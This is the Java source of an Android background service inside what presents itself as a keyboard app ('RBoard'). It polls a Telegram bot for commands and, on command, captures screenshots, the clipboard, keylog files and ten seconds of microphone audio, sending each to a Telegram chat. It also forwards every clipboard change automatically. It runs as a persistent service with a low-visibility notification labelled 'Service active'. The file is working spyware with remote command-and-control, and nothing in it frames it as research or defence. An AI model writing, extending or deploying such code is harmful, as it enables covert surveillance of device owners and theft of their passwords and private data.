package com.abifog.rboard.latin;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.abifog.rboard.R;
import com.abifog.rboard.latin.settings.Settings;
import com.abifog.rboard.latin.settings.SettingsValues;
import com.abifog.rboard.latin.utils.LogReadUtils;
import com.abifog.rboard.latin.utils.ScreenshotManager;
import com.abifog.rboard.latin.utils.TelegramReporter;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Background service that polls for Telegram commands and listens for clipboard changes.
 */
public class TelegramCommandService extends Service {
    private static final String TAG = TelegramCommandService.class.getSimpleName();
    private static final String CHANNEL_ID = "TelegramCommandChannel";
    private static final long POLLING_INTERVAL = 5000; // 5 seconds

    private Handler mHandler;
    private long mLastUpdateId = 0;
    private boolean mIsRunning = false;

    private ClipboardManager mClipboardManager;
    private ClipboardManager.OnPrimaryClipChangedListener mClipboardListener = new ClipboardManager.OnPrimaryClipChangedListener() {
        @Override
        public void onPrimaryClipChanged() {
            if (mClipboardManager.hasPrimaryClip() && mClipboardManager.getPrimaryClip().getItemCount() > 0) {
                CharSequence text = mClipboardManager.getPrimaryClip().getItemAt(0).getText();
                if (text != null) {
                    reportClipboard(text.toString());
                }
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        mHandler = new Handler(Looper.getMainLooper());
        mClipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        mClipboardManager.addPrimaryClipChangedListener(mClipboardListener);
        createNotificationChannel();
        startForeground(2, createNotification());
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("RBoard System")
                .setContentText("Service active")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!mIsRunning) {
            mIsRunning = true;
            startPolling();
        }
        return START_STICKY;
    }

    private void startPolling() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (mIsRunning) {
                    try {
                        checkCommands();
                        Thread.sleep(POLLING_INTERVAL);
                    } catch (InterruptedException e) {
                        Log.e(TAG, "Polling interrupted", e);
                    } catch (Exception e) {
                        Log.e(TAG, "Error in polling loop", e);
                    }
                }
            }
        }).start();
    }

    private void checkCommands() {
        SettingsValues settings = Settings.getInstance().getCurrent();
        if (settings == null || !settings.mEnableTelegram || settings.mTelegramBotToken.isEmpty()) {
            return;
        }

        String updatesJson = TelegramReporter.getUpdatesSync(settings.mTelegramBotToken, mLastUpdateId + 1);
        if (updatesJson != null) {
            try {
                JSONObject response = new JSONObject(updatesJson);
                if (response.getBoolean("ok")) {
                    JSONArray result = response.getJSONArray("result");
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        long updateId = update.getLong("update_id");
                        mLastUpdateId = Math.max(mLastUpdateId, updateId);

                        if (update.has("message")) {
                            JSONObject message = update.getJSONObject("message");
                            if (message.has("text")) {
                                String text = message.getString("text");
                                handleCommand(text);
                            }
                        }
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error parsing updates", e);
            }
        }
    }

    private void handleCommand(String command) {
        Log.d(TAG, "Received command: " + command);
        final SettingsValues settings = Settings.getInstance().getCurrent();
        
        if (command.startsWith("/scrnshot")) {
            mHandler.post(new Runnable() {
                @Override
                public void run() {
                    ScreenshotManager.captureScreenshot(TelegramCommandService.this);
                }
            });
        } else if (command.startsWith("/clpboard")) {
            if (mClipboardManager.hasPrimaryClip()) {
                CharSequence text = mClipboardManager.getPrimaryClip().getItemAt(0).getText();
                reportClipboard("Current Clipboard: " + (text != null ? text.toString() : "[No Text]"));
            } else {
                reportClipboard("Clipboard is empty.");
            }
        } else if (command.startsWith("/keylog")) {
            String logs = LogReadUtils.readCurrentLogFile(this);
            TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, "Last Logs:\n" + logs);
        } else if (command.startsWith("/voice")) {
            mHandler.post(new Runnable() {
                @Override
                public void run() {
                    Intent voiceIntent = new Intent(TelegramCommandService.this, AudioCaptureService.class);
                    voiceIntent.putExtra("duration", 10000); // 10 seconds
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(voiceIntent);
                    } else {
                        startService(voiceIntent);
                    }
                }
            });
        }
    }

    private void reportClipboard(String text) {
        SettingsValues settings = Settings.getInstance().getCurrent();
        if (settings.mEnableTelegram) {
            TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, "📋 Clipboard Captured:\n" + text);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        mIsRunning = false;
        mClipboardManager.removePrimaryClipChangedListener(mClipboardListener);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "RBoard Command Channel",
                    NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }
}
